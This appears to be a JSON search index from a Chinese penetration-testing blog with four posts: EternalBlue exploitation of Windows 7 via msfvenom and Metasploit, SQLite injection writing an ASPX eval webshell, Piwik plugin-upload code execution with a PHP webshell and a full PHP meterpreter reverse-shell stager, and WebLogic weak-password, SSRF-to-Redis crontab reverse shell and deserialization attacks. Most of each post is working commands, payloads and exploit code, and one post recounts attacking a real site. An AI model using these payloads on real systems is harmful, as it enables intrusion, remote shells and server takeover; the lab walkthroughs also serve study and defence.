{"pages":[{"title":"使用PentestBox工具利用ETERNALBLUE对Win7进行攻击，获取Meterpreter反弹","url":"/2017/08/16/HOW-TO-USE-PENTESTBOX-TO-EXPLOIT-ETERNALBLUE-ON-WINDOWS-7/","text":"前言MS17-010已经过去很久了，利用PentestBox的方式也提到过，但都是基于python2.6那种方式实现的。本文将使用Sleepya 的脚本利用ETERNALBLUE来实现对Win7进行攻击，从而获取Meterpreter反弹。 靶机为Windows 7，IP为192.168.131.133。攻击机为Win10系统，安装了PentestBox，IP为192.168.217.1。脚本下载地址：https://github.com/worawit/MS17-010 漏洞利用测试1.安装NASM下载地址：http://www.nasm.us/pub/nasm/releasebuilds/ ，我这里用的是2.13。然后开始安装。 安装完成后加入环境变量。 2.下载利用脚本，并编译内核shellcode1git clone https://github.com/worawit/MS17-010 编译内核shellcode 123cd MS17-010/shellcode/nasm -f bin eternalblue_kshellcode_x64.asmnasm -f bin eternalblue_kshellcode_x86.asm 3.生成反弹exp12msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 -f raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.binmsfvenom -p windows/x64/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 -f raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin 4.合并SHELLCODE123cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bincat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.binpython eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin 5.开启Metasploit并监听1234567891011msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set ExitOnSession falsemsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set EXITFUNC threadmsf exploit(handler) &gt; set LHOST 192.168.217.1msf exploit(handler) &gt; set LPORT 4444msf exploit(handler) &gt; exploit -j...msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LPORT 4445msf exploit(handler) &gt; exploit -j 6.进行攻击1python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.bin 看到已经获取Meterpreter反弹。 遇到的问题在PentestBox中运行一些命令时(如msfconsole)，提示不是内部或外部命令，也不是可运行的程序或批处理文件。解决方法：输入cmd之后再输入需要执行的命令。 总结1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。3.在使用中设置了线程，可以同时对多个系统进行攻击测试。例如：1234python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.134 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.135 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.136 shellcode\\sc_all.bin 攻击结果： 参考[1]https://github.com/worawit/MS17-010[2]https://www.exploit-db.com/docs/42280.pdf","tags":"ms17-010 pentestbox metasploit"},{"title":"SQLite手工注入Getshell技巧","url":"/2017/07/19/SQLite-Injection-Get-WebShell/","text":"0x01 前言SQLite是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。 0x02 SQLite的使用SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问 SQLite下载页面，从 Windows 区下载预编译的二进制文件。现在最新的为sqlite-tools-win32-x86-3190300.zip，下载下来后解压。我这里将其中的文件复制到D:\\sqlite目录。 SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。 创建使用命令：sqlite3.exe 数据库文件名。例如创建一个名字为aa.db的数据库，使用命令：sqlite3.exe aa.db。 附加数据库的基本语法是：ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：attach database &#39;d:\\\\sqlite\\\\bb.db&#39; as &#39;a&#39;;。 创建表并插入数据的命令如下： 1create table a.tt(dataz text); INSERT into a.tt(dataz) VALUES ('test'); SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：&lt;?php phpinfo();?&gt;。 具体命令如下： 1sqlite&gt;ATTACH DATABASE 'd:\\\\sqlite\\\\23.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');-- 将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。 同样的方法生成aspx后缀的数据库文件，创建表，并插入&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。 通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。 0x03 本地环境搭建及获取SHELL因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。 1.环境搭建和项目的部署下载安装 Sqlite ADO.NET，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。 这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。 其目录结构如图： Default.aspx是显示页面，其中有一个文本框和按钮。主要代码： 123456&lt;form id=\"form1\" runat=\"server\"&gt;&lt;div&gt; &lt;asp:TextBox ID=\"TextBox1\" runat=\"server\"&gt;&lt;/asp:TextBox&gt; &lt;asp:Button ID=\"Button1\" runat=\"server\" OnClick=\"btn_Click\" Text=\"查询\" /&gt;&lt;/div&gt;&lt;/form&gt; Default.aspx.cs是代码的实现，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Data.SQLite; public partial class _Default : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; if (!System.IO.File.Exists(Server.MapPath(\"~\") + \"/UserData.dbx\")) &#123; SQLiteConnection.ClearAllPools(); SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)\"; cmd.Connection = conn; cmd.ExecuteNonQuery(); for (int i = 0; i &lt; 100; i++) &#123; cmd.CommandText = \"insert into Users (UserID,UserName,UserPassword) values (\" + i + \",'TestUser_\" + i + \"','\" + DateTime.Now.ToString().Replace(\" \", \"-\").Replace(\":\", \"-\") + \"')\"; cmd.ExecuteNonQuery(); &#125; conn.Clone(); conn.Dispose(); Response.Write(\"初始化~~&lt;br /&gt;\"); &#125; Response.Write(\"加载成功~~&lt;br /&gt;\"); &#125; protected void btn_Click(object sender, EventArgs e) &#123; if (TextBox1.Text != \"\")&#123; SQLiteConnection.ClearAllPools(); //SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"select UserPassword from Users where UserName='\" + TextBox1.Text.Trim()+\"'\"; cmd.Connection = conn; if (cmd.ExecuteScalar() != null) &#123; string tempUserName = cmd.ExecuteScalar().ToString(); Response.Write(\"查询结果为:\" + tempUserName + \"&lt;br /&gt;&lt;br /&gt;\"); &#125; else &#123; Response.Write(\"无此用户\"); &#125; &#125; else &#123; Response.Write(\"请输入查询内容~~&lt;br /&gt;\"); &#125; &#125;&#125; 然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。 2.SQL注入写WEBSHELL 当输入&#39;时，项目报错，同时将web绝对路径暴露出来。 然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。 其语句为： 1';ATTACH DATABASE 'c:\\\\WebSite\\\\css.aspx' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"%&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。 0x04 实际中应用中遇到的问题及解决方法已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。 直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\24.txt' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。 打开发现竟然是空的。然而将shell代码替换为字符串test时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。 由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。 提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\fp.jpg' AS pwn;create TABLE pwn.exp(dataz text);-- 可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。 分别在本地和web上生成一个txt格式的数据库文件，新建表后插入test。然后对比其内容： 对比后发现网站生成的内容都多了一个空格。 有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。 本地测试也失败。 经过搜索发现，SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 例如&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;在SQLite中的十六进制表示为：1x'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e' 成功写入shell 菜刀连接： 0x05 总结通过以上的测试过程和实际利用，可以归纳两点： 1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。2.SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 0x06 参考[1]http://www.cnblogs.com/xiaozi/p/5760321.html[2]https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet[3]http://blog.csdn.net/mazhaojuan/article/details/7660657","tags":"webshell sqlite"},{"title":"Piwik代码执行漏洞安全分析（附验证过程Getshell）","url":"/2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/","text":"0x01 概述Piwik是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。 Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。 在17年2月份FireFart报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。 0x02 漏洞原理分析插件激活时请求的URL为：http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff 代码定位到piwik-3.0.1\\plugins\\CorePluginsAdmin\\Controller.php中的activate方法。 找到pluginManager调用的激活插件方法。123456789public function activate($redirectAfter = true) &#123; $pluginName = $this-&gt;initPluginModification(static::ACTIVATE_NONCE); $this-&gt;dieIfPluginsAdminIsDisabled(); $this-&gt;pluginManager-&gt;activatePlugin($pluginName);//激活插件 .... //省略部分代码 &#125; 然后往上翻，找到pluginManager变量。 12345private $pluginManager;....//省略部分代码$this-&gt;pluginManager = Plugin\\Manager::getInstance();..... 定位到piwik-3.0.1\\core\\Plugin\\Manager.php文件，找到其activatePlugin方法。 1234567891011121314public function activatePlugin($pluginName) &#123; .... //省略部分代码 // Load plugin $plugin = $this-&gt;loadPlugin($pluginName); if ($plugin === null) &#123; throw new \\Exception(\"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'\"); &#125; $this-&gt;installPluginIfNecessary($plugin); $plugin-&gt;activate(); .... //省略部分代码 &#125; loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下：12345678910public function loadPlugin($pluginName)&#123; if (isset($this-&gt;loadedPlugins[$pluginName])) &#123; return $this-&gt;loadedPlugins[$pluginName]; &#125; $newPlugin = $this-&gt;makePluginClass($pluginName); $this-&gt;addLoadedPlugin($pluginName, $newPlugin); return $newPlugin;&#125; installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。 由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。接下来就开始搭建环境具体来实现一下。 0x03 环境的搭建1.准备工作主机：Windows10 x64 WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ） 程序版本：3.0.1(也可以在https://builds.piwik.org/ 下载) 2.composer工具的安装下载地址：https://getcomposer.org/Composer-Setup.exe 下载后直接运行Composer-Setup.exe进行安装。 然后根据提示，继续下一步即可。 注意：安装时PHP应开启php_openssl扩展，不然会报错。 3.Piwik程序的部署将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。 在piwik-3.0.1目录下执行composer install命令来安装项目所依赖的代码库。 安装后在项目的根目录会出现一个vendor文件夹。 访问http://192.168.217.1/piwik-3.0.1/ 开始进行安装 点击Next进行下一步安装。 数据库设置 超级用户设置 之后进行系统的设置，这里就省略过程了。 安装完成后访问http://192.168.217.1/piwik-3.0.1/ 进行登陆。 用户名/密码为第五步中设置的超级用户。 0x04 验证过程1.漏洞产生原因及PayLoad的编写Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。 如果我们编写一个名字叫做pwned的插件，其文件结构为：123pwned/pwned/pwned.phppwned/plugin.json 文件内容： pwned.php 12345678&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; //要执行的Payload &#125;&#125; plugin.json 123456&#123; \"name\": \"pwned\",//插件名称 \"description\": \"DESCRIPTION\",//插件描述 \"version\": \"1.0\",//插件版本 \"theme\": false&#125; 然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。 2.漏洞利用PayLoad的准备 修改上述的pwned.php代码，在install方法中添加写shell的代码。12345678910&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; $myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\"); $content = \"&lt;?eval(\\$_POST['pass']);?&gt;\"; fwrite($myfile, $content); &#125;&#125; plugin.json不用做过多的修改。 然后压缩为pwned.zip。 PayLoad的利用 利用创建的超级用户登陆，登陆后点击Administration或者访问http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday 安装新插件 上传新插件 插件上传 插件上传成功 然后点击激活插件按钮 插件激活后，会在根目录生成一个shell.php 3.利用Metasploit生成meterpreter会话上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。 1234567891011msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload msf exploit(piwik_superuser_plugin_upload) &gt; msf exploit(piwik_superuser_plugin_upload) &gt; set PASSWORD admin888PASSWORD =&gt; admin888msf exploit(piwik_superuser_plugin_upload) &gt; set RHOST 192.168.217.1RHOST =&gt; 192.168.217.1msf exploit(piwik_superuser_plugin_upload) &gt; set TARGETURI /piwik-3.0.1/TARGETURI =&gt; /piwik-3.0.1/msf exploit(piwik_superuser_plugin_upload) &gt; set USERNAME adminUSERNAME =&gt; adminmsf exploit(piwik_superuser_plugin_upload) &gt; exploit 利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。 0x05 总结之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。 这里仅仅用3.0.1举例，根据firefart说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。 Q:直接上传包含shell的压缩包可以吗？ A:可以上传成功，但在plugins目录下无法执行php代码。 Q:Payload中除了install()方法还可以写其他方法吗？ A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码： 123456789101112131415161718192021222324252627282930&lt;?phpnamespace Piwik\\Plugins\\ff;class ff extends \\Piwik\\Plugin &#123; public function install()//安装插件，执行一次 &#123; $myfile = fopen(\"install.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"install ...\"; fwrite($myfile, $content); &#125; public function uninstall()//卸载插件，执行一次 &#123; $myfile = fopen(\"uninstall.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"uninstall ...\"; fwrite($myfile, $content); &#125; public function deactivate()//关闭插件，可以多次执行 &#123; $myfile = fopen(\"deactivate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"deactivate ...\"; fwrite($myfile, $content); &#125; public function activate()//激活插件，可以多次执行 &#123; $myfile = fopen(\"activate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"activate ...\"; fwrite($myfile, $content); &#125;&#125; Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？ A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。 具体可以这样操作： 首先看看Metasploit利用的Payload是什么。 可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用print_status(&quot;data:#{payload.encoded}&quot;)将其内容打印出来 然后使用reload_all重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容 或者可以利用msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php来生成payload，内容一样 然后将生成的内容放在插件PHP代码中。整理格式后如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; error_reporting(0); $ip = '192.168.131.128'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f(\"tcp://&#123;$ip&#125;:&#123;$port&#125;\"); $s_type = 'stream'; &#125; elseif (($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; elseif (($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; else &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die(); &#125;&#125; 然后就是利用上传插件来上传插件并激活了。 正确姿势： 请注意要加set PAYLOAD php/meterpreter/reverse_tcp，不然会报各种错误。 下面的为其中的错误。 0x06 参考[1]https://firefart.at/post/turning_piwik_superuser_creds_into_rce/[2]https://github.com/rapid7/metasploit-framework/pull/7917","tags":"metasploit piwik 漏洞分析"},{"title":"Weblogic 常见漏洞环境的搭建及其利用","url":"/2017/06/05/Weblogic-Vulnerability-Verification/","text":"0x00 WebLogic 介绍及常见漏洞WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址https://github.com/phith0n/vulhub/tree/master/weblogic。 0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。下载项目后进入到/weblogic/weak_password目录，运行命令sudo docker-compose build进行编译（请参照https://github.com/phith0n/vulhub/blob/master/README.md 进行docker的安装）。编译完成后进行启动使用如下命令：12fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps #查看启动的docker Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：http://192.168.232.137:7001 访问 http://192.168.232.137:7001/console 会跳转到管理员登录页面http://192.168.232.137:7001/console/login/LoginForm.jsp 这里用户名密码分别为：weblogic/Oracle@123上传war过程如下图所示 总结起来就是：域结构-部署-安装-上传文件-将此部署安装为应用程序。然后访问项目名称即可。 如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。 WebLogic加密解密方式 WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 例如靶机中的密码文件位于：/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 内容为：12username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= 加密key保存在SerializedSystemIni.dat文件中。默认位置：安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat 靶机中的位于：/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat 采用这两个文件就可以进行解密了。 WebLogic 11gR1之前的版本采用的DES加密方式。安装目录/samples/domains/wl_server/security/boot.properties内容格式：12username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw== 采用上面的解密工具即可解密。 0x02 WebLogic SSRF漏洞漏洞编号：CVE-2014-4210漏洞影响： 版本10.0.2,10.3.6 Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。进入到/weblogic/ssrf目录，运行命令sudo docker-compose build进行编译。 编译时将Dockerfile文件中的第六行&amp;&amp; yum update \\修改为&amp;&amp; yum update -y \\，不然会出现错误ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex &amp;&amp; yum update &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1。并且无法编译。（感谢P牛的解答） 编译完成后进行启动使用如下命令：12fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps #查看启动的docker 利用脚本扫描内网开放端口的主机。 根据https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md 利用Redis反弹shell在Ubuntu上执行命令nc -l -p 1234发送请求包123456789GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1Host: 192.168.232.137:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006Connection: closeUpgrade-Insecure-Requests: 1 过一会查看Ubuntu可以看到一个shell 修复建议： 1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。 2.安装oracle的更新包。 0x03 WebLogic 反序列化漏洞漏洞编号：CVE-2015-4852漏洞影响： Oracle WebLogic Server 12.2.1.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.1.2.0 Oracle WebLogic Server 10.3.6.0 Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。 这里还以SSRF的环境为例。使用WebLogic反序列化工具进行验证（作者：rebeyond)。 一般web项目位于/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/中 发现没有_WL_user目录，所以把shell上传到自带的项目中。 通过执行命令ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。将shell文件上传到任意一个目录下的war文件即可。 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp 也可以使用weget下载。 使用weak_password时，上传路径为 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt 找WEB绝对路径的另一种方式，Linux下使用命令find -name *.jsp来查找，例如已知hello项目里面有个file.jsp，则查找的命令为find -name file.jsp。对于Windows下，使用for /r c:\\ %i in (file*.jsp) do @echo %i，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。 linux下查找文件路径 Windows下查找路径 修复建议： 1.过滤T3协议 2.安装补丁 0x04 